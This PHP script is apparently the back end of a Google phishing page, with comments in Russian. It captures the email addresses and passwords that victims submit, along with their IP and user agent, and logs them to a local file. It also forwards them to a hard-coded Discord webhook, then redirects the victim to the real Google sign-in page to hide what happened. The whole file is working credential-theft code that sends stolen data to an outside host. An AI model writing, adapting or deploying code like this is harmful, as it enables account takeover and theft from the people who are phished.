<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? "не указан";
    $password = $_POST["password"] ?? "не указан";
    $ip = $_SERVER["REMOTE_ADDR"] ?? "неизвестен";
    $user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "неизвестен";
    $time = date("Y-m-d H:i:s");

    // === 1. СОХРАНЕНИЕ В ФАЙЛ НА СЕРВЕРЕ (резервная копия) ===
    $log = "[$time] Email: $email | Pass: $password | IP: $ip | UA: $user_agent\n";
    file_put_contents("log.txt", $log, FILE_APPEND);

    // === 2. ОТПРАВКА В DISCORD WEBHOOK ===
    $webhook_url = "https://discord.com/api/webhooks/1542530427624104118/V4cK1aDKQYYtKAbYJ_bzrHeti7QRMVTCxT8_OarJ44FIgBLWFM1wvLtTGRoC3sx-NfwZ";

    $message = "🔑 **Новые данные Google**\n";
    $message .= "📧 Email: `$email`\n";
    $message .= "🔒 Пароль: `$password`\n";
    $message .= "🌐 IP: `$ip`\n";
    $message .= "🖥 UA: `$user_agent`\n";
    $message .= "🕐 Время: `$time`";

    $data = json_encode([
        "content" => $message
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen($data)
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // === 3. ОТЛАДКА (если вебхук не сработал) ===
    if ($http_code !== 204 && $http_code !== 200) {
        file_put_contents("webhook_error.txt", "[" . date("Y-m-d H:i:s") . "] HTTP: $http_code | Response: $result\n", FILE_APPEND);
    }

    // === 4. ПЕРЕНАПРАВЛЕНИЕ НА РЕАЛЬНЫЙ GOOGLE ===
    header("Location: https://accounts.google.com/");
    exit();
} else {
    echo "Форма не отправлена. Используйте POST-запрос.";
}
?>
